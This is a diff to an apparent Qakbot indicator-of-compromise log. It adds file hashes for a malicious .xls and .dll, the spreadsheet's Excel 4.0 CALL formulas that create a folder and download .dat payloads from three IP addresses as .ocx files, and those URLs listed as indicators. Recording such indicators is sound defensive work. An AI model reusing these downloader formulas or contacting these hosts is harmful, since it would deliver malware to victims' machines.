@@ -1,5 +1,21 @@
 24.02.2022 | Qakbot | ?? | 
 
+******************************
+
+.xls 71805df6272036ba19ea6d4b91c03e9f7e11e2ab67e54724c0dba959c5392467
+.dll be7e0c5b7566efa2d8b39bada9bd9e114f8ccc27c71327026f616e85bb2adb30
+
+=CALL("Kernel32", "CreateDirectoryA", "CJ", "C:\a", 0)
+=CALL("uRlMon", "URLDownloadToFileA", "JCCB", 0, "http://185.81.113.214/44616.7186241898.dat", "C:\a\Gertiokas1.ocx")
+=CALL("uRlMon", "URLDownloadToFileA", "JCCB", 0, "http://67.43.234.56/44616.7186241898.dat", "C:\a\Gertiokas2.ocx")
+=CALL("uRlMon", "URLDownloadToFileA", "JCCB", 0, "http://23.106.124.9/44616.7186241898.dat", "C:\a\Gertiokas3.ocx")
+
+http://185.81.113.214/44616.7186241898.dat
+http://67.43.234.56/44616.7186241898.dat
+http://23.106.124.9/44616.7186241898.dat
+
+******************************
+
 .xls 1c7829f0316c7aeb94e0887bedf93e3667ab1283659bb1e3d5bcb2860d609ec1
 .dll 283fed02e9434975e43435a8748ab01451199a061da32e94e39128fd7745db24
 
